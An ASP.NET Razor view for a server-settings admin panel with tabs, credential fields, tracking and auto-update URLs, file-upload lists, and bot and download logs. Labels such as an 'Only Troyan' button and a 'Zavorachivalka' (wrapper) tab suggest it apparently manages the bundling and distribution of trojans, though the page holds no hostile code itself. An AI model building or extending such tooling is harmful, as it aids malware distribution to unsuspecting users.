@model model.ServerModel
@{
Layout = "~/Views/Shared/_Layout.cshtml";
}

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Server Settings</title>
    <style>
        .form-group {
            /* Ensure the container doesn't affect the layout */
            overflow: hidden;
            margin-bottom: 10px; /* Optional spacing between form groups */
        }

        .form-group label {
            float: left; /* Float label to the left */
            margin-right: 10px; /* Optional spacing between label and input */
            line-height: 34px; /* Adjust line height for vertical alignment */
        }

        .form-group .form-control {
            float: left; /* Float input field to the left */
            margin-right: 10px; /* Optional spacing between input and button */
            border: 1px solid #ccc; /* Border for input fields */
        }

        .form-group button {
            float: left; /* Float button to the left */
            line-height: 34px; /* Adjust line height for vertical alignment */
            border: 1px solid #ccc; /* Border for buttons */
        }

        .icon-preview image {
            width: 100px;
            height: 100px;
        }

        /* Optional CSS for styling the message */
        .message-container {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            border: 1px solid #ccc;
            padding: 20px;
            max-width: 80%;
            max-height: 80%;
            overflow-y: auto;
            z-index: 1000;
        }

        .file-upload-container {
            margin: 20px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            max-width: 600px;
            border: 1px solid #ddd; /* Tiny border for sections */
        }

        .file-upload-list {
            list-style-type: none;
            padding: 0;
        }

        .file-upload-list li {
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .file-upload-list button {
            margin-left: 10px;
            background-color: #ff0000;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        /* Card sections with tiny borders */
        .card {
            border: 1px solid #ddd; /* Tiny border for card sections */
        }

        .card-header {
            border-bottom: 1px solid #ddd; /* Tiny border for card header */
        }

        .card-body {
            border-top: 1px solid #ddd; /* Tiny border for card body */
        }
        
    </style>
    
    <style>
        .tab-container1 {
            display: flex;
            cursor: pointer;
        }

        .tab1 {
            padding: 10px;
            border: 1px solid #ddd;
            margin-right: 5px;
            background: #f1f1f1;
        }

        .tab-content1 {
            display: none;
        }

        .tab-content1.active {
            display: block;
        }
    </style>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Show the first tab by default
            const firstTab = document.querySelector('.tab1');
            if (firstTab) {
                showTab(firstTab.dataset.id);
            }

            // Attach event handlers to tab buttons
            document.querySelectorAll('.tab1').forEach(function (tab) {
                tab.addEventListener('click', function (event) {
                    event.preventDefault(); // Prevent default action (e.g., form submission)
                    showTab(tab.dataset.id);
                });
            });
        });

        function showTab(tabId) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content1').forEach(function (content) {
                content.classList.remove('active');
            });

            // Show the selected tab content
            const selectedContent = document.getElementById(tabId);
            if (selectedContent) {
                selectedContent.classList.add('active');
            }
        }
    </script>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>

<form method="post" enctype="multipart/form-data">
    <div class="container mt-5">

    <table>
        <tr>
            <td>
                <ul class="nav nav-tabs" id="myTab" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="edit-server-settings-tab" data-bs-toggle="tab" data-bs-target="#edit-server-settings" type="button" role="tab" aria-controls="edit-server-settings" aria-selected="true">Edit Server Settings</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="bux-tab" data-bs-toggle="tab" data-bs-target="#bux" type="button" role="tab" aria-controls="bux" aria-selected="false">Bux</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="dnSponsor-tab" data-bs-toggle="tab" data-bs-target="#dnSponsor" type="button" role="tab" aria-controls="dnSponsor" aria-selected="false">DnSposnor</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="ad-scripts-tab" data-bs-toggle="tab" data-bs-target="#ad-scripts" type="button" role="tab" aria-controls="ad-scripts" aria-selected="false">Ad Scripts</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="zavorachivalka-tab" data-bs-toggle="tab" data-bs-target="#zavorachivalka" type="button" role="tab" aria-controls="zavorachivalka" aria-selected="false">Zavorachivalka</button>
                    </li>
                    <li class="nav-item" role="docs">
                        <button class="nav-link" id="docs-tab" data-bs-toggle="tab" data-bs-target="#docs" type="button" role="tab" aria-controls="docs" aria-selected="false">Documents</button>
                    </li>
                </ul>

            </td>
            
            <td align="right">
                <!-- Reboot Button -->
                <div class="form-group mt-3">
                    &nbsp;&nbsp;&nbsp;&nbsp;
                    <button type="submit" name="action" value="reboot" class="btn btn-primary">Reboot</button>
                </div>
            </td>
        </tr>
    </table>
  

        <div class="tab-content" id="myTabContent">

            <div class="tab-pane fade show active" id="edit-server-settings" role="tabpanel" aria-labelledby="edit-server-settings-tab">
                <div class="card">
                    <div class="card-header">
                        <h2>Edit Server Settings</h2>
                    </div>
                    <div class="card-body">
                        <input type="hidden" name="Server" value=""/>

                        <div class="row">
                            <!-- First Column -->
                            <div class="col-md-6">
                                <!-- General Settings -->
                                <div class="form-group">
                                    <label>Server</label>
                                    <input name="Server" readonly="readonly" value="@Model.Server" class="form-control"/>
                                    <span class="text-danger"></span>
                                    <button onclick="toggleServerHint('serverHint')">[ ? ]</button>
                                    <div id="serverHint" class="message-container">
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label>Alias</label>
                                    <input name="Alias" value="@Model.Alias" class="form-control"/>
                                    <span class="text-danger"></span>
                                    <div id="serverHint" class="message-container">
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label>StrahServer</label>
                                    <input name="StrahServer" value="@Model.StrahServer" class="form-control"/>
                                    <span class="text-danger"></span>
                                    <div id="serverHint" class="message-container">
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label>Login</label>
                                    <input name="Login" value="@Model.Login" class="form-control"/>
                                    <span class="text-danger"></span>
                                </div>

                                <div class="form-group">
                                    <label>Password</label>
                                    <input name="Password" value="@Model.Password" class="form-control"/>
                                    <span class="text-danger"></span>
                                </div>

                                <div class="form-group">
                                    <label>Primary DNS</label>
                                    <input name="PrimaryDns" readonly="readonly" value="@Model.PrimaryDns" class="form-control"/>
                                    <span class="text-danger"></span>
                                </div>

                                <div class="form-group">
                                    <label>Secondary DNS</label>
                                    <input name="SecondaryDns" readonly="readonly" value="@Model.SecondaryDns" class="form-control"/>
                                    <span class="text-danger"></span>
                                </div>

                                <!-- Track and Tracking URL -->
                                <div class="form-group">
                                    <label>
                                        <input type="checkbox" name="Track" value="true" @(Model.Track ? "checked" : "")/> Track.
                                    </label>
                                    <span class="text-danger"></span>


                                    <label>Tracking URL</label>
                                    <input name="TrackUrl" value="@Model.TrackUrl" class="form-control"/>
                                    <span class="text-danger"></span>
                                    
                                    <hr/>
                                    
                                    <a href="/stats/dayly" target="_blank">View Daily Statistics</a>&nbsp;&nbsp;&nbsp;       
                                    <a href="/stats/botlog" target="_blank">BotLog</a>
                                    <a href="/stats/downloadlog" target="_blank">DownloadLog</a>

                                    <!-- ClearStats Button -->
                                    <div class="form-group mt-3">
                                        &nbsp;&nbsp;&nbsp;&nbsp;
                                        <button type="submit" name="action" value="clearstats" class="btn btn-primary">Clear Stats</button>
                                    </div>
                                </div>
                                
                                <div class="form-group">
                                    <label>
                                        <input type="checkbox" name="AutoStart" value="true" @(Model.AutoStart ? "checked" : "")/> Auto Start
                                    </label>
                                    <span class="text-danger"></span>
                                </div>

                                <div class="form-group">
                                    <label>
                                        <input type="checkbox" name="AutoUpdate" value="true" @(Model.AutoUpdate ? "checked" : "")/> Auto Update.
                                    </label>
                                    <span class="text-danger"></span>

                                    <label>Update URL</label>
                                    <input name="UpdateUrl" value="@Model.UpdateUrl" class="form-control"/>
                                    <span class="text-danger"></span>
                                </div>


                                <!-- IP Domains in Frame -->
                                <div class="frame">
                                    <h5>IP Domains</h5>
                                    <div class="form-group">
                                        @foreach (var item in Model.IpDomains)
                                        {
                                            <div class="form-row">
                                                <div class="col">
                                                    <div class="input-group">
                                                        <input type="text" readonly="readonly" name="@item.Key" value="@item.Key" class="form-control"/>
                                                        <input type="text" name="IpDomains[@item.Key]" value="@item.Value" class="form-control"/>
                                                    </div>
                                                </div>
                                            </div>
                                        }
                                    </div>
                                </div>

                                <div class="form-group">
                                    <label>FTP</label>
                                    <span class="text-danger"></span>
                                    <input name="Ftp" readonly="readonly" value="@Model.Ftp" class="form-control"/>
                                    <span class="text-danger"></span>
                                    <a href="@Model.FtpAsHttp" target="_blank">@Model.FtpAsHttp</a>
                                </div>

                                <!-- Save Button -->
                                <div class="form-group mt-3">
                                    &nbsp;&nbsp;&nbsp;&nbsp;
                                    <button type="submit" name="action" value="apply" class="btn btn-primary">Apply Changes</button>
                                </div>

                            </div>

                            <!-- Second Column -->
                            <div class="col-md-6">
                                
                                <div class="frame">
                                    <div class="tab-container1">
                                        @foreach (var tab in Model.Tabs)
                                        {
                                            <button class="tab1" data-id="@tab.Id">
                                                @tab.Id
                                            </button>
                                        }
                                    </div>

                                    @foreach (var tab in Model.Tabs)
                                    {
                                        <div id="@tab.Id" class="tab-content1">
                                            @await Html.PartialAsync("_TabContent", tab)
                                        </div>
                                    }

                                    <!-- Save Button -->
                                    <div class="form-group mt-3">
                                        <button type="submit" name="action" value="exe" class="btn btn-primary">Only Troyan</button>
                                    </div>
                                </div>
                                
                            </div>

                        </div>
                    </div>
                </div>
            </div>
            
            <div class="tab-pane fade" id="bux" role="tabpanel" aria-labelledby="bux-tab">
                <div class="card">
                    <div class="card-header">
                        <h2>Bux</h2>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            @await Component.InvokeAsync("Bux", new { buxModels = Model.Bux })
                        </div>
                    </div>
                </div>
            </div>


            <div class="tab-pane fade" id="dnSponsor" role="tabpanel" aria-labelledby="dnSponsor-tab">
                <div class="card">
                    <div class="card-header">
                        <h2>DnSponsor</h2>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            @await Component.InvokeAsync("DnSponsor", new { DnSponsorModels = Model.DnSponsor })
                        </div>
                    </div>
                </div>
            </div>


            <div class="tab-pane fade" id="ad-scripts" role="tabpanel" aria-labelledby="ad-scripts-tab">
                <div class="card">
                    <div class="card-header">
                        <h2>Ad Scripts</h2>
                    </div>
                    <div class="card-body">
                        <!-- Content for Ad Scripts -->
                        Your content here...
                    </div>
                </div>
            </div>

        <div class="tab-pane fade" id="zavorachivalka" role="tabpanel" aria-labelledby="zavorachivalka-tab">
            <div class="card">
                <div class="card-header">
                    <h2>Zavorachivalka</h2>
                </div>
                <div class="card-body">
                    <!-- Content for Zavorachivalka -->
                    Your content here...
                </div>
            </div>
        </div>

            <div class="tab-pane fade" id="docs" role="tabpanel" aria-labelledby="docs-tab">
                <div class="card">
                    <div class="card-header">
                        <h2>Documents</h2>
                    </div>
                    <div class="card-body">
                        <div class="form-group">
                            <label>Google Doc</label>
                            <input name="UrlDoc" value="@Model.UrlDoc" class="form-control"/>
                            <span class="text-danger"></span>
                            <br/>
                            <br/>
                            <a href="@Model.UrlDoc" target="_blank">Goto Google Document</a>&nbsp;&nbsp;&nbsp;
                        </div>
                    </div>
                </div>
            </div>

        </div>

        @if (Model.Result != null)
        {
        <h2>Postback Content</h2>
        <textarea style="width: 90%; height: 200px" >@Model.Result</textarea>
        }
    </div>
</form>

<script>
    function initializeFileUploadComponent(source, fileInputId, fileListId, sourceFiles) {
        const fileInput = document.getElementById(fileInputId);
        const fileList = document.getElementById(fileListId);

        function loadExistingFiles() {
            sourceFiles.forEach(fileName => {
                const li = document.createElement('li');
                li.textContent = fileName;

                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = source;
                hiddenInput.value = fileName;

                const removeButton = document.createElement('button');
                removeButton.textContent = 'Remove';
                removeButton.type = 'button';
                removeButton.addEventListener('click', function() {
                    li.remove();
                });

                li.appendChild(hiddenInput);
                li.appendChild(removeButton);
                fileList.appendChild(li);
            });
        }

        function handleFileSelect(event) {
            const files = event.target.files;

            for (let i = 0; i < files.length; i++) {
                const li = document.createElement('li');
                li.textContent = files[i].name;

                const removeButton = document.createElement('button');
                removeButton.textContent = 'Remove';
                removeButton.type = 'button';
                removeButton.addEventListener('click', function() {
                    li.remove();
                });

                li.appendChild(removeButton);
                fileList.appendChild(li);
            }
        }

        // Initialize existing files and file input event listener
        loadExistingFiles();
        fileInput.addEventListener('change', handleFileSelect);
    }

    initializeFileUploadComponent('Embeddings', 'embeddingsInput', 'embeddingsList', @Html.Raw(Json.Serialize(Model.Embeddings)));

    initializeFileUploadComponent('Front', 'frontInput', 'frontList', @Html.Raw(Json.Serialize(Model.Front)));

    document.addEventListener('DOMContentLoaded', function () {
        const deleteButtons = document.querySelectorAll('.delete-button');
        deleteButtons.forEach(button => {
            button.addEventListener('click', function () {
                const listItem = this.closest('li');
                listItem.remove();
            });
        });
    });
</script>

<script>
    function toggleServerHint(containerId) {
        var container = document.getElementById(containerId);
        // Toggle display between block and none
        if (container.style.display === 'block') {
            container.style.display = 'none';
        } else {
            container.style.display = 'block';
        }
    }
</script>

</body>
</html>
